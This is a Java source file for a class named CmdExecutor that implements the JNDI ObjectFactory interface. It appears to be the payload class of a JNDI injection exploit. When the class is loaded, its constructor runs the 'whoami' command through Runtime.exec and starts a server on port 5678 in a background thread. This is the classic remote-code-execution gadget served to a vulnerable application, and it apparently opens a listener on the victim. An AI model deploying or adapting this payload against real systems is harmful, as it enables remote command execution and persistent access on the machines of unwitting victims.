import java.io.*;
import java.util.Hashtable;

import service.Server;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class CmdExecutor implements ObjectFactory {

    String cmd="whoami";

    public CmdExecutor() throws Exception {
        exec();
        new Thread(()-> {
            try {
                new Server().start(5678);
            } catch (Exception e) {
                System.err.println("some err happened: "+ e);
            }
        }).start();
    }

    public void exec() {
        final Process process;
        try {
            System.out.print("CmdExecutor ==> whoami: ");
            process = Runtime.getRuntime().exec(cmd);
            int value=process.waitFor();
            Reader reader =new InputStreamReader(process.getInputStream());
            BufferedReader bf = new BufferedReader(reader);
            String line = null;
            try {
                while ((line=bf.readLine())!=null)
                {
                    System.out.println(line);
                }
            }catch (IOException e){
                System.err.println("some err happened: "+ e);
            }
        } catch (IOException | InterruptedException e) {
            System.err.println("some err happened: "+ e);
        }

    }

    @Override
    public Object getObjectInstance(Object o, Name name, Context context, Hashtable<?, ?> hashtable) throws Exception {
        return null;
    }
}